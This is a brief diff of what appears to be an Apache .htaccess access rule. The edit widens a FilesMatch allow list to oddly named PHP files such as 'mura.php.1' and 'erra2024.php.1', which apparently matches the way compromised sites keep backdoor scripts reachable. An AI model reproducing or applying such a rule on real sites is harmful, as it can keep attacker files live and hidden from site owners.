@@ -6,7 +6,7 @@
    
    </FilesMatch>
    
-   <FilesMatch "^(index.html|qwerty.php)$">
+   <FilesMatch "^(index.php|mura.php.1|erra2024.php.1|BaseLayout.php|DefaultLayout.php|MegaMenu.php|Class.php)$">
    
     Order allow,deny
    
